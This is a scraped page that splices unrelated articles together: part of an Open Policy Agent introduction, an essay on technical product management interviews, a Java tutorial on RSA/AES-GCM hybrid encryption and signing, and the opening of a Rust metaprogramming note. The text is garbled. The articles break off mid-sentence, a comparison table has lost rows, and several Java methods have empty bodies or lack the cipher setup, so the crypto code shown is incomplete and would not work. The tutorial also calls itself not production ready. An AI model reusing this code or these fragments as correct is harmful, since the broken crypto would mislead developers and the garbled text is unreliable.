<li>Modifying existing policies, or introducing new ones, is a nightmare. Just think of how many places you’ll need to visit to give Alice read access to all storage-related systems. This means S3, MySQL, MongoDB, and perhaps an external API to name a few.</li>
<li>There’s no way for developers to enforce policies on their own systems. They can obviously hardcode their authorization logic in the application, but that makes things intricately worse: trying to unify policies among different microservices is highly complicated.</li>
<li>Adding to the previous point, introducing a new policy to local services may require changing the code and, thus, introduce new versions of&nbsp;<em>all</em>&nbsp;the microservices.</li>
<li>What if you want to integrate policies with an existing user database? For example, integrating with the HR database.</li>
<li>We’ll need to visualize the policy to ensure that it’s doing what it’s supposed to do. This becomes of increasing importance as your policies get more complex.</li>
<li>Modern systems comprise multiple technologies and services which are written in different languages. For example, you may have the core of your system running on Kubernetes, and a bunch of legacy APIs that are not part of the cluster written in Java, Ruby, and PHP. Each platform has its own authorization mechanism.</li>
</ul>
<p>Let’s look at Kubernetes as an example. If all users were authorized access to the entire cluster, lots of nasty things can happen such as:</p>
<ul>
<li>Giving unlimited requests and limits to all the pods may cause random pods to get evicted from the nodes.</li>
<li>Pulling and using untested, haphazard images that may contain security vulnerabilities or malicious content.</li>
<li>Using Ingress controllers without TLS, allowing unencrypted, unsecured traffic to the application.</li>
<li>Numerous other unforeseen risks due to the overall complexity.</li>
</ul>
<p>You can definitely use&nbsp;<a href="https://www.magalix.com/blog/kubernetes-rbac-101" rel=" noopener">RBAC</a>&nbsp;and&nbsp;<a href="https://www.magalix.com/blog/kubernetes-pods-101-the-cluster-sailors" rel=" noopener">Pod security policies</a>&nbsp;to impose fine-grained control over the cluster. But again, this will only apply to the cluster. Kubernetes RBAC is of no use except in a Kubernetes cluster.</p>
<p>That’s where Open Policy Agent (OPA) comes into play. OPA was introduced to create a unified method of enforcing security policy in the stack.</p>
<h2>How Does OPA Work?</h2>
<p>Earlier, we explored the policy-enforcement strategies and what OPA tries to solve – that showed us the “what” part. Now, let’s now take a look at the “how.”</p>
<p>Let’s say that you’re implementing the Payments service of our example application. This service is responsible for handling customer payments. It exposes an API where it accepts payment from the customer. It also allows the user to query which payments were made by a specific customer. So, to obtain an array containing the purchases done by Jane, who is one of the company’s customers, you send a GET request to the API with the path /payment/jane. You provide your credential information in the Authorization header and send the request. The response would be a JSON array with the data you requested. However, since you don’t want just anyone with network access to have access to the Payments API to see such sensitive data, you need to enforce an authorization policy. OPA addresses the issue in the following way:</p>
<ol>
<li>The Payments API queries OPA for a&nbsp;<em>decision</em>. It accompanies this query with some&nbsp;<em>attributes</em>&nbsp;like the HTTP method used in the request, the path, the user, and so on.</li>
<li>OPA validates those attributes against data already provided to it.</li>
<li>After validation, OPA sends a&nbsp;<em>decision</em>&nbsp;to the requesting API with either&nbsp;<em>allow</em>&nbsp;or&nbsp;<em>deny</em>.</li>
</ol>
<p>The important thing to notice here is that OPA decouples our policy decision from policy enforcement. The OPA workflow can be depicted in the following diagram:</p>

<p>OPA is a general-purpose, domain-agnostic policy enforcement tool. It can be integrated with APIs, the Linux SSH daemon, an object store like CEPH, etc. OPA designers purposefully avoided basing it on any other project. Accordingly, the policy query and decision do not follow a specific format. That is, you can use&nbsp;<em>any</em>&nbsp;valid JSON data as request attributes as long as it provides the required data. Similarly, the policy decision coming from OPA can also be any valid JSON data. You choose what gets input and what gets output. For example, you can opt to have OPA return a True or False JSON object, a number, a string, or even a complex data object.</p>
<h2>OPA Internals</h2>
<p>To fully understand OPA and start implementing it in your own projects, you must familiarize yourself with its features and components. Let’s start with how you define your policies.</p>
<h2>Policy Language: Rego</h2>
<p>Rego is a high-level declarative language that was built specifically for OPA. It makes it very easy to define policies and address questions like: is Bob allowed to perform a GET request on /api/v1/products? Which records is he actually allowed to view?</p>
<h2>Deployment</h2>
<p>When it comes to deploying OPA, you have more than one option depending on your specific scenario:</p>
<ul>
<li><strong>As a Go library:</strong>&nbsp;if your application is written in Golang, you can implement OPA as a third-party library in the application.</li>
<li><strong>As a daemon:</strong>&nbsp;if you’re not using Go, then you can deploy OPA just like any other service, as a daemon. In this case, it’s recommended that you use a sidecar container or run it on the host level. The reason is that this design increases performance and availability. Imagine that you have OPA deployed in Kubernetes in a separate pod that happens to live on a separate node than where your application pod is running. Now, every time your service needs to consult OPA for a policy decision, it has to make a call over the network to reach the pod where OPA is running. This introduces unneeded latency and may cause application lags at peak times.</li>
</ul>

<h2>How To Manage And Control OPA?</h2>
<p>To further reduce latency, the designers decided that OPA should keep all the policy data in memory. This ensures that OPA is not going to query another service to request the data. To deal with OPA, you have a set of APIs that serve different purposes:</p>
<ul>
<li><strong>Bundle service</strong><strong>&nbsp;API:</strong>&nbsp;used for sending policy data to OPA. OPA continuously polls the Bundle service API searching for new versions of the policy. Once found, it pulls and applies the new version.</li>
<li><strong>Status service API:</strong>&nbsp;used for determining the status of the service. It tells you the current policy version that’s active on OPA.</li>
<li><strong>Decision log service API:</strong>&nbsp;every time OPA makes a policy decision, it logs it. Later on, it sends batches of those logs to the log service API. This is particularly useful for audit and troubleshooting purposes.</li>
<li><strong>Tools for building, testing, and debugging policies:</strong>&nbsp;a set of command-line tools that you can use like opa test, opa run, opa checks, etc. There’s also a&nbsp;<a href="https://marketplace.visualstudio.com/items?itemName=tsandall.opa">VS Code plugin</a>&nbsp;available to ease development.</li>
</ul>
<h2>Your First OPA Policy</h2>
<p>By now you should have a pretty clear picture why OPA came to existence, the problems it tries to solve, and the way it was designed and managed. It’s time to test the waters and see what it’s like to create a policy in the Rego …</p></div></div></div></article></div></div>

        <p>Most people know what a Product Manager is, but few know what a Product Manager does. Luckily, the world has given us a few archetypes to help us on our journey of understanding Product Management.</p>

<p>There’s Adam, the Google Product Manager who estimates the number of podcast listeners in Lithuania on a post-it note during lunch.</p>

<p>There’s Amber, the Intuit Product Manager who invites her customers to Corporate Headquarters to participate in a focus group.</p>

<p>And there’s Eve, the former Software Engineer who has decided that writing emails to the marketing department is more fun than debugging a Java 6 codebase written by a girl who retired four years ago.</p>

<p>As you make your way into Product Management, you’ll hear about these stereotypes and think <em>fine, but at 3pm on Tuesday, what is Product Manager Eve actually doing</em>!? Unfortunately, the most common resource on Product Management doesn’t really help us understand the role. In terms of books, <a href="https://amzn.to/2MyTLSy">Cracking the Product Manager Interview</a> is probably the most popular Product Management resource, and Lewis Lin’s <a href="https://amzn.to/375sZuo">Decode and Conquer</a> is another.</p>

<p>While both resources are useful to prepare for an interview, the nature of Product Management has changed substantially since both books were published. And that’s only the interview-related resources. In order to understand the nature of the job itself, the gold-standard guide to Product Management is still <a href="https://www.khoslaventures.com/wp-content/uploads/Good_Product_Manager_Bad_Product_Manager_KV.pdf">a PDF published by Ben Horowitz in 1997</a>.</p>

<p>To put that into perspective, in 1997 the hottest tech product in the world was the Tamagatchi.</p>

<p><img src="https://elimernit.com/assets/images/tamagotchi.jpg" alt="tamagotchi"></p>

<p><em>Remember these?</em></p>

<p>Despite the growing interest in Product Management, I’ve found few resources that explain what product managers actually do. Moreover, I’ve found hardly any resources that explain what <em>technical</em> product managers actually do.</p>

<p>I think it’s time to offer my brief but contemporary perspective on Technical Product Management. Specifically, what the job is, why it’s different from “non-technical” product management, and a bunch of practical interview tips to help you succeed in your job search.</p>



<p>My path to Product Management wasn’t straightforward.</p>

<p>After graduating college, I hadn’t received any job offers I was excited about, so I decided to spend the next few months working on passion projects. That summer, I decided to start building and flipping eCommerce stores. I spent the next year immersed in the world of eCommerce. In addition to building my own stores, I helped some small businesses in New York with freelance consulting work. After a year of being a digital nomad in my native New York (i.e. living with my parents and occasionally travelling to Europe), I felt my skills starting to plateau, and so I decided to start exploring opportunities at startups.</p>

<p>I had become increasingly interested in blockchain technology during this phase, and I decided to focus my efforts there. Product Management seemed like the obvious path for my skill set. I sort of knew how to program, I felt comfortable doing sales, and I liked designing interfaces.</p>

<p>After applying to a few startups, I finally landed at a 15-person blockchain company in Brooklyn. It was my first real job after college, and my first experience as a PM.</p>

<p>When I started the job, I worked on nearly all aspects of the business. I redesigned the website, setup an email marketing funnel, and gave demos to prospective customers at meetups. Most of my work was ad-hoc.</p>

<p>After a few months, I was promoted, and my responsibilities became more narrowly defined. The company was preparing to go-to-market and had a long list of features that needed to be built to be seriously considered by customers. From that point on, it was my job to write product requirements for all of our new features. Each week, I’d sit down with the founders and write up requirements documents that would dictate the work our engineering team would work on for the duration of their sprint.</p>

<p>The job ended up being a good fit for my writing-heavy humanities curriculum in college. I wrote dozens of specs, and read <a href="https://www.joelonsoftware.com/2000/10/02/painless-functional-specifications-part-1-why-bother/">Joel Spolsky’s blog</a>.</p>



<p>The main job of a PM is to ensure that a company delivers a product that aligns to a company’s mission. The PM meets with her stakeholders to decide which features to deliver, and at what cost. It’s the PM’s job to ensure that their product delivers value to the customers and the business.</p>

<p>However, the job of a Technical PM is to ensure that the work outputs of the engineers help support that mission.</p>

<p>Here’s a little 2x2 with some of the tactical differences between the two flavors of Product Managers:</p>

<table>
  <thead>
    <tr>
      <th>Business PM</th>
      <th>Technical PM</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Stakeholders are users</td>
      <td>Stakeholders are engineers</td>
    </tr>
    <tr>
      <td>Plans launch</td>
      <td>Plans sprint</td>
    </tr>

      <td>Dependency on designers</td>
      <td>Dependency on dev ops</td>
    </tr>
    <tr>
      <td>Google Analytics</td>
      <td>Datadog</td>
    </tr>
    <tr>
      <td>Sketch</td>
      <td>VSCode</td>
    </tr>

      <td>Writes JSON</td>
    </tr>
  </tbody>
</table>

<p>So, while a business PM might own a launch, a TPM will usually own the requirements for a new feature. Your ability to succeed in requirement gathering requires three main skills:</p>

<h3 id="be-comfortable-scheduling-meetings-with-people-in-other-parts-of-the-organization">Be comfortable scheduling meetings with people in other parts of the organization</h3>

<p>As a PM, one of your main jobs is communication across teams. While the engineers usually have more tasks than you, you have more leverage. Scheduling the right meeting with the right people in order to unblock a project or help someone make a decision is often worth more than two weeks worth of code.</p>

<h3 id="have-a-lawyers-understanding-of-programming">Have a lawyer’s understanding of programming</h3>

<p>Why a lawyer’s understanding? Because lawyers are often tasked with describing technical details to laypeople. If you’ve ever read a memo prepared by a lawyer, you’ll notice that they explain technical details in an extremely simplified level of detail. As a TPM, you should have a similar understanding of software. Remember, it’s not your job to help the engineers implement features. Your only job is to understand how a piece of code might benefit the business so that you can prioritize engineering work accordingly.</p>

<h3 id="be-capable-of-summarizing-technical-information-in-a-written-format">Be capable of summarizing technical information in a written format</h3>

<p>After you’ve scheduled meetings and extracted information from your stakeholders, you’ll need to distill your findings into a requirement document or a JIRA ticket. Writing is one of the most important TPM skills. You’ll need to summarize information from several meetings into bullet points that business people can understand. If you’re able to schedule meetings with the right people and summarize those meetings as bullet points, you’re 90% of the way towards being an excellent TPM.</p>



<p>When you apply for a TPM position, the hiring manager is trying to answer one big question while reading your resume: is the candidate comfortable working with engineers? The answer is usually conveyed in your experience. Have you worked on a hackathon team? Did you sit between an engineer and a designer in your last job?</p>

<p>If you’ve already worked as a non-technical PM, getting experience working closely with engineers is the best step towards getting past the resume stage. Remember, you don’t need software engineering experience to get here. You only need to prove that you’re capable of contributing to technical discussions.</p>

<p>As a general rule, having some hands-on programming experience is helpful. Luckily, the extent of this knowledge can be fairly narrow. No, you don’t need to know algorithms. But, here’s the one skill that will put you on a fast-track towards success: be capable of building a CRUD API. What’s a CRUD API? CRUD is just an acronym for create, read, update, delete, which are the main verbs associated with REST APIs. Building a CRUD API entails a few steps:</p>

<ol>
  <li>Write code to retrieve and insert data from a database</li>
  <li>Host the database on the cloud</li>
  <li>Host the code on the cloud, and expose an HTTP endpoint</li>
  <li>Invoke the code from the terminal as a CURL request</li>
</ol>

<p>If you’re able to accomplish this, you’ll be in a great position to communicate technical concepts during your interviews. You might be wondering whether this is really necessary for a TPM.</p>

<p>In my opinion, while it’s not absolutely necessary, I believe a baseline level of hands-on ability is necessary for having the confidence to work on a technical team. And, while you can practice the algorithms in Cracking the Coding Interview until your dry-erase marker runs out, you’ll be disappointed to learn that 99% of modern software engineering is building very simple features, like getting a user’s birthday from the database.</p>

<p>While some companies do use algorithm ability as a makeshift aptitude test, this is not very common for TPM interviews. Instead, the main aptitude test for TPMs is whether you can take a large amount of information and convert it into concise bullet points.</p>



<h3 id="the-phone-screen">The Phone Screen</h3>

<p>During the phone screen, hiring managers are looking to answer three questions:</p>

<ul>
  <li>Is the candidate comfortable working with engineers?</li>
  <li>Can the candidate explain technical concepts clearly?</li>
  <li>Is the candidate familiar with the software development process?</li>
</ul>

<h3 id="the-technical-interview">The Technical Interview</h3>

<p>If you’ve made it past the phone screen, you’ll usually be invited to chat with the hiring manager. This is usually your prospective manager. Their goal is to evaluate you according to the same metrics listed above, but in a little more detail. You’ll be asked longer-form questions, such as:</p>

<ul>
  <li>Walk me through a product you built (if you don’t have formal PM experience, talking about a CRUD API you built is a great talking point here!)</li>
</ul>

<h3 id="the-on-site">The On-Site</h3>

<p>Just like the technical interview, this stage is designed to evaluate you based on the same core metrics: whether you’re comfortable working with engineers, can explain concepts clearly, and understand the software lifecycle. Expect the questions in this stage to be more open-ended. You’ll probably be given a case study-esque scenario to answer, which will require you to organize your thoughts using a whiteboard. You can expect questions, such as:</p>

<ul>
  <li>Our company is going to partner with Stripe in order to accept payments. …</li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This post shows how to work with RSA on the JVM with the Java language. We’re gonna:</p><ul><li>Generate two keypairs (one for alice, one for bob)</li><li>Save these keypairs to a file and load them again</li><li>Send a message from alice to bob using a hybrid encryption scheme with confidentiality and authenticity</li></ul><p><em>Disclaimer</em>: This post is intended to show the concepts underpinning a hybrid encryption scheme. This is <strong>not production ready code</strong>! If you need something for your productive
application, consider <a href="https://libsodium.gitbook.io/doc/public-key_cryptography/authenticated_encryption">using something like libsodium</a>. libsodium is production grade and even uses modern cryptographic
algorithms like the X25519 elliptic curve and the XSalsa20-Poly1305 stream cipher. And you need way less code :) <a href="https://github.com/phxql/libsodium-java-playground/blob/master/src/main/java/libsodium/playground/App.java#L123">Here’s an example</a> how to use libsodium with Java.</p><p>But now let’s get into action! First, let’s generate the key pairs:</p><div><pre><code data-lang="java"><span>private</span> <span>KeyPair</span> <span>generateKeyPair</span><span>()</span> <span>{</span>
  <span>KeyPairGenerator</span> <span>keyPairGenerator</span> <span>=</span> <span>KeyPairGenerator</span><span>.</span><span>getInstance</span><span>(</span><span>"RSA"</span><span>);</span>
  <span>keyPairGenerator</span><span>.</span><span>initialize</span><span>(</span><span>2048</span><span>);</span> <span>// bits
</span><span></span>  <span>return</span> <span>keyPairGenerator</span><span>.</span><span>generateKeyPair</span><span>();</span>
<span>}</span>
</code></pre></div><p>Note that we use RSA keys with 2048 bit size. If you’re paranoid, you can set this to 4096 (see <a href="https://en.wikipedia.org/wiki/Key_size#Asymmetric_algorithm_key_lengths">this Wikipedia site for recommendations</a>).</p><div><pre><code data-lang="java"><span>KeyPair</span> <span>alice</span> <span>=</span> <span>generateKeyPair</span><span>();</span>
<span>KeyPair</span> <span>bob</span> <span>=</span> <span>generateKeyPair</span><span>();</span>
</code></pre></div><p>Let’s add some methods to save these keys for later use:</p><div><pre><code data-lang="java"><span>private</span> <span>void</span> <span>savePrivateKey</span><span>(</span><span>Path</span> <span>file</span><span>,</span> <span>PrivateKey</span> <span>privateKey</span><span>)</span> <span>{</span>

<span>}</span>
</code></pre></div><p>This method will save the RSA private key in a format called <a href="https://en.wikipedia.org/wiki/PKCS_8">PKCS #8</a>. Note that we don’t use the PEM encoding here (stuff starting with <code>-----BEGIN ...</code>), we just save the binary
representation.</p><p>And here’s the method to save the public key:</p><div><pre><code data-lang="java"><span>private</span> <span>void</span> <span>savePublicKey</span><span>(</span><span>Path</span> <span>file</span><span>,</span> <span>PublicKey</span> <span>publicKey</span><span>)</span> <span>{</span>

  <span>Files</span><span>.</span><span>write</span><span>(</span><span>file</span><span>,</span> <span>publicSpec</span><span>.</span><span>getEncoded</span><span>());</span>
<span>}</span>
</code></pre></div><p>The public key is stored in a format called <a href="https://en.wikipedia.org/wiki/X.509">X.509</a>.</p><p>Now we can use these to store the private and public keys from alice and bob:</p><div><pre><code data-lang="java"><span>savePrivateKey</span><span>(</span><span>Paths</span><span>.</span><span>get</span><span>(</span><span>"alice.private"</span><span>),</span> <span>alice</span><span>.</span><span>getPrivate</span><span>());</span>

</code></pre></div><p>As we can now save private and public keys in files, methods to load them back from the files would be great:</p><div><pre><code data-lang="java"><span>private</span> <span>PrivateKey</span> <span>loadPrivateKey</span><span>(</span><span>Path</span> <span>file</span><span>)</span> <span>{</span>
  <span>byte</span><span>[]</span> <span>privateKey</span> <span>=</span> <span>Files</span><span>.</span><span>readAllBytes</span><span>(</span><span>file</span><span>);</span>

  <span>KeyFactory</span> <span>keyFactory</span> <span>=</span> <span>KeyFactory</span><span>.</span><span>getInstance</span><span>(</span><span>"RSA"</span><span>);</span>
  <span>// Expects the private key encoded in PKCS #8
</span><span></span>  <span>return</span> <span>keyFactory</span><span>.</span><span>generatePrivate</span><span>(</span><span>new</span> <span>PKCS8EncodedKeySpec</span><span>(</span><span>privateKey</span><span>));</span>
<span>}</span>
</code></pre></div><p>This will load the private key from the given file. The file needs to be encoded in PKCS #8 format.</p><div><pre><code data-lang="java"><span>private</span> <span>PublicKey</span> <span>loadPublicKey</span><span>(</span><span>Path</span> <span>file</span><span>)</span> <span>{</span>

<span>}</span>
</code></pre></div><p>This method will load the public key from the given file. The file needs to be encoded in X.509 format.</p><p>Now we can use these methods to load the keys from the file again:</p><div><pre><code data-lang="java"><span>alice</span> <span>=</span> <span>new</span> <span>KeyPair</span><span>(</span>
  <span>loadPublicKey</span><span>(</span><span>Paths</span><span>.</span><span>get</span><span>(</span><span>"alice.public"</span><span>)),</span>
  <span>loadPrivateKey</span><span>(</span><span>Paths</span><span>.</span><span>get</span><span>(</span><span>"alice.private"</span><span>))</span>
<span>);</span>

<span>bob</span> <span>=</span> <span>new</span> <span>KeyPair</span><span>(</span>
  <span>loadPublicKey</span><span>(</span><span>Paths</span><span>.</span><span>get</span><span>(</span><span>"bob.public"</span><span>)),</span>
  <span>loadPrivateKey</span><span>(</span><span>Paths</span><span>.</span><span>get</span><span>(</span><span>"bob.private"</span><span>))</span>
<span>);</span>        
</code></pre></div><p>Great. Now we can start to encrypt data. We will use a hybrid encryption scheme: first, we generate an AES 256 bit session key. With this session key, we will
AES/GCM encrypt the secret message. Then we will encrypt this session key with the RSA public key of the receiver. We do this as RSA has some limitations:</p><p>First, it’s really slow, AES is much faster. Second, RSA can only encrypt data which is smaller than the key size (2048 bits in our example). As our AES session key
is only 256 bit, the slowness and data limitation of RSA doesn’t matter.</p><p>First, let’s generate a random session key:</p><div><pre><code data-lang="java"><span>private</span> <span>SecretKey</span> <span>generateSessionKey</span><span>()</span> <span>{</span>
    <span>KeyGenerator</span> <span>keyGenerator</span> <span>=</span> <span>KeyGenerator</span><span>.</span><span>getInstance</span><span>(</span><span>"AES"</span><span>);</span>
    <span>keyGenerator</span><span>.</span><span>init</span><span>(</span><span>256</span><span>);</span> <span>// bits
</span><span></span>    <span>return</span> <span>keyGenerator</span><span>.</span><span>generateKey</span><span>();</span>
<span>}</span>
</code></pre></div><p>Second, we need a method to encrypt data with AES/GCM:</p><div><pre><code data-lang="java"><span>private</span> <span>byte</span><span>[]</span> <span>encryptWithAES</span><span>(</span><span>byte</span><span>[]</span> <span>data</span><span>,</span> <span>SecretKey</span> <span>sessionKey</span><span>)</span> <span>{</span>

  <span>// 128 is the size of the authentication tag in bits. 128 is the maximum.
</span><span></span>  <span>// Nonce is always 96 bit long. We use 0 as nonce here, as we generate a new session key each time. Reusing a nonce
</span><span></span>  <span>// is only fatal when the key is the same.
</span><span></span>  <span>GCMParameterSpec</span> <span>gcmSpec</span> <span>=</span> <span>new</span> <span>GCMParameterSpec</span><span>(</span><span>128</span><span>,</span> <span>new</span> <span>byte</span><span>[</span><span>96</span> <span>/</span> <span>8</span><span>]);</span>

  <span>return</span> <span>cipher</span><span>.</span><span>doFinal</span><span>(</span><span>data</span><span>);</span>
<span>}</span>
</code></pre></div><p>This method will encrypt the given data with the given session key.</p><p>Now we can use these two methods to encrypt some data with a generated session key:</p><div><pre><code data-lang="java"><span>SecretKey</span> <span>sessionKey</span> <span>=</span> <span>generateSessionKey</span><span>();</span>

<span>String</span> <span>data</span> <span>=</span> <span>"Dear Bob, this is my very secret message, only for your eyes."</span><span>;</span>

</code></pre></div><p><code>aesEncrypted</code> now contains the AES encrypted data we want to send to Bob. To decrypt it, Bob needs the session key, and in the next step we will encrypt the session key with the RSA public key from Bob.</p><p>First, create a new method to encrypt data with a RSA public key:</p><div><pre><code data-lang="java"><span>private</span> <span>byte</span><span>[]</span> <span>encryptWithRSA</span><span>(</span><span>byte</span><span>[]</span> <span>data</span><span>,</span> <span>PublicKey</span> <span>recipientPublicKey</span><span>)</span> <span>{</span>

  <span>rsa</span><span>.</span><span>init</span><span>(</span><span>Cipher</span><span>.</span><span>ENCRYPT_MODE</span><span>,</span> <span>recipientPublicKey</span><span>);</span>

  <span>return</span> <span>rsa</span><span>.</span><span>doFinal</span><span>(</span><span>data</span><span>);</span>
<span>}</span>
</code></pre></div><p>We use RSA with OAEP padding (<a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Optimal asymmetric encryption padding</a> - great name!). Don’t let the <code>ECB</code> in the code above scare you, in this case it’s safe.
OAEP will make sure that the same plaintext will not encrypt to the same ciphertext (a property ECB has and which <a href="https://crypto.stackexchange.com/questions/14487/can-someone-explain-the-ecb-penguin">makes it insecure</a>).</p><p>Now we can use this method to encrypt the session key with the recipients public key (in this case Bobs public key):</p><div><pre><code data-lang="java"><span>byte</span><span>[]</span> <span>rsaEncrypted</span> <span>=</span> <span>encryptWithRSA</span><span>(</span><span>sessionKey</span><span>.</span><span>getEncoded</span><span>(),</span> <span>bob</span><span>.</span><span>getPublic</span><span>());</span>
</code></pre></div><p>We can now send <code>aesEncrypted</code> and <code>rsaEncrypted</code> over an insecure wire to Bob. But how does Bob knows that the data is really from Alice? With the code above we have created confidentiality, but not authenticity (and no, use of AES/GCM <a href="https://security.stackexchange.com/questions/169998/what-differs-the-authenticity-provided-by-rsa-signing-and-aes-gcm">hasn’t fixed that</a>).
To do that, we can use another great property of RSA: it can sign data so that the receiver can be sure that the sender really is the sender and not some attacker.</p><p>Let’s create a method for that:</p><div><pre><code data-lang="java"><span>private</span> <span>byte</span><span>[]</span> <span>signWithRSA</span><span>(</span><span>byte</span><span>[]</span> <span>data</span><span>,</span> <span>PrivateKey</span> <span>senderPrivateKey</span><span>)</span> <span>{</span>
  <span>Signature</span> <span>rsa</span> <span>=</span> <span>Signature</span><span>.</span><span>getInstance</span><span>(</span><span>"SHA256withRSA"</span><span>);</span>
  <span>rsa</span><span>.</span><span>initSign</span><span>(</span><span>senderPrivateKey</span><span>);</span>

  <span>rsa</span><span>.</span><span>update</span><span>(</span><span>data</span><span>);</span>
  <span>return</span> <span>rsa</span><span>.</span><span>sign</span><span>();</span>
<span>}</span>
</code></pre></div><p>This method will hash the given data with SHA-256 and then sign this hash with the <em>private key</em> of the sender (in our case Alice). To verify the signature the recipient (Bob) needs the <em>public key</em> of the sender (Alice). That’s the only open problem with this scheme: you’ll need to somehow get Alice’s public key to Bob without letting an attacker swap Alice’s public key with his own.
Unfortunately I can’t give you a great solution for that :(</p><p>But back to signing the message with RSA:</p><div><pre><code data-lang="java"><span>byte</span><span>[]</span> <span>signature</span> <span>=</span> <span>signWithRSA</span><span>(</span><span>rsaEncrypted</span><span>,</span> <span>alice</span><span>.</span><span>getPrivate</span><span>());</span>
</code></pre></div><p>Now we can send <code>aesEncrypted</code>, <code>rsaEncrypted</code> and <code>signature</code> to Bob over an insecure wire. Bob needs the public key of Alice to verify the signature and then his own private key to decrypt the session key. Then he can use the
session key to AES decrypt the data.</p><p>Let’s start with signature verification:</p><div><pre><code data-lang="java"><span>private</span> <span>boolean</span> <span>verifyWithRSA</span><span>(</span><span>byte</span><span>[]</span> <span>data</span><span>,</span> <span>byte</span><span>[]</span> <span>signature</span><span>,</span> <span>PublicKey</span> <span>senderPublicKey</span><span>)</span> <span>{</span>
  <span>Signature</span> <span>rsa</span> <span>=</span> <span>Signature</span><span>.</span><span>getInstance</span><span>(</span><span>"SHA256withRSA"</span><span>);</span>
  <span>rsa</span><span>.</span><span>initVerify</span><span>(</span><span>senderPublicKey</span><span>);</span>

  <span>rsa</span><span>.</span><span>update</span><span>(</span><span>data</span><span>);</span>
  <span>return</span> <span>rsa</span><span>.</span><span>verify</span><span>(</span><span>signature</span><span>);</span>
<span>}</span>
</code></pre></div><p>This method will create the SHA-256 hash of the given data and uses the sender’s public key to verify if it matches the given signature. If everything is good, it returns <code>true</code>, otherwise it returns <code>false</code>. We can now use this
to verify that the message is really from Alice:</p><div><pre><code data-lang="java"><span>if</span> <span>(!</span><span>verifyWithRSA</span><span>(</span><span>rsaEncrypted</span><span>,</span> <span>signature</span><span>,</span> <span>alice</span><span>.</span><span>getPublic</span><span>()))</span> <span>{</span>
    <span>throw</span> <span>new</span> <span>IllegalStateException</span><span>(</span><span>"Unable to verify the authenticity of the message!"</span><span>);</span>
<span>}</span>
</code></pre></div><p>Next, we add a method to decrypt data with RSA:</p><div><pre><code data-lang="java"><span>private</span> <span>byte</span><span>[]</span> <span>decryptWithRSA</span><span>(</span><span>byte</span><span>[]</span> <span>ciphertext</span><span>,</span> <span>PrivateKey</span> <span>recipientSecretKey</span><span>)</span> <span>{</span>

  <span>return</span> <span>rsa</span><span>.</span><span>doFinal</span><span>(</span><span>ciphertext</span><span>);</span>
<span>}</span>
</code></pre></div><p>Now we can use this method to decrypt the ciphertext of <code>rsaEncrypted</code> to Bobs copy of the session key using his private key:</p><div><pre><code data-lang="java"><span>byte</span><span>[]</span> <span>bobsSessionKeyAsBytes</span> <span>=</span> <span>decryptWithRSA</span><span>(</span><span>rsaEncrypted</span><span>,</span> <span>bob</span><span>.</span><span>getPrivate</span><span>());</span>

</code></pre></div><p>This session key can now be used to AES decrypt the ciphertext in <code>aesEncrypted</code>. First, let’s add a method to decrypt AES:</p><div><pre><code data-lang="java"><span>private</span> <span>byte</span><span>[]</span> <span>decryptWithAES</span><span>(</span><span>byte</span><span>[]</span> <span>ciphertext</span><span>,</span> <span>SecretKey</span> <span>sessionKey</span><span>)</span> <span>{</span>

  </p>
  <p>I explore how to use Rust compiler internals to metaprogram Rust using information from the typechecker, e.g. to automatically insert garbage-collection into Rust code, and discuss the benefits and drawbacks of this approach.</p>
  <p><em>All code in this note is available in the <a href="https://github.com/willcrichton/rustc-type-metaprogramming">rustc-type-metaprogramming</a> repository.</em></p>

<h2 id="introduction">Introduction</h2>

<p>Metaprogramming, or code that generates code<sup id="fnref:1"><a href="#fn:1">1</a></sup>, is broadly useful in statically typed languages for providing abstractions that are difficult to capture in the base syntax or type system. For example, Rust uses <a href="https://doc.rust-lang.org/book/first-edition/macros.html">macros</a> for simple pattern-matching-based code substitution (a more powerful and hygienic version of the C preprocessor), e.g. to implement variadic arguments like in <a href="https://doc.rust-lang.org/1.11.0/std/macro.println!.html">println!</a> and early returns like in <a href="https://doc.rust-lang.org/1.11.0/std/macro.try!.html">try!</a>.</p>

<div><div><pre><code><span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>println!</span><span>(</span><span>"{} {} {}"</span><span>,</span> <span>"This has"</span><span>,</span> <span>"many"</span><span>,</span> <span>"arguments"</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>However, pattern-matching-based metaprogramming tools are limited to simple syntactic transformations. Many common use cases require introspecting a syntactic construct and generating code accordingly, most notably <a href="https://github.com/dtolnay/syn#example-of-a-custom-derive">custom derive</a>. In that example, the metaprogram takes a struct and generates code by looking at the struct’s fields, e.g. to automatically generate <a href="https://github.com/serde-rs/serde">serializers</a> or <a href="http://docs.diesel.rs/diesel/deserialize/trait.Queryable.html">SQL queries</a>.</p>

<div><div><pre><code><span>#[derive(Serialize)]</span>
<span>struct</span> <span>Point</span> <span>{</span> <span>x</span><span>:</span> <span>f32</span><span>,</span> <span>y</span><span>:</span> <span>f32</span> <span>}</span>

<span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>let</span> <span>origin</span><span>:</span> <span>Point</span> <span>=</span> <span>Point</span> <span>{</span> <span>x</span><span>:</span> <span>0</span><span>,</span> <span>y</span><span>:</span> <span>0</span> <span>};</span>
    <span>println!</span><span>(</span><span>"{}"</span><span>,</span> <span>origin</span><span>.to_json</span><span>());</span> <span>// {"x": 0, "y": 0}</span>
<span>}</span>
</code></pre></div></div>

<p>Many of these custom derives are in fact examples of type-directed metaprograms, since they use the type of the struct fields to determine what code to generate.  However, this approach has two limitations:</p>
<ol>
  <li>This only works for structs since Rust requires the programmer to explicitly write down the type of each field. Many types in Rust are not written down, but instead inferred by the compiler.</li>
  <li>The types are only treated syntactically, not semantically. For example, if the programmer does:
    <div><div><pre><code> <span>type</span> <span>MyFloat</span> <span>=</span> <span>f32</span><span>;</span>

 <span>#[derive(Serialize)]</span>
 <span>struct</span> <span>Point</span> <span>{</span> <span>x</span><span>:</span> <span>MyFloat</span><span>,</span> <span>y</span><span>:</span> <span>f32</span> <span>}</span>
</code></pre></div>    </div>
    <p>Then then the deriver has no way to understand that the types <code>MyFloat</code> and <code>f32</code> are the same.</p>
  </li>
</ol>

<p>More broadly, the issue is that <em>most compilers refuse to expose their type systems (or other internals) to the outside world.</em> Even today, compilers are largely treated as black boxes whose input is a text file and whose output is either a working binary or an error message. At most, languages like Rust will expose their syntax through procedural macro systems, never providing APIs for types, lifetimes, or properties/IRs.</p>

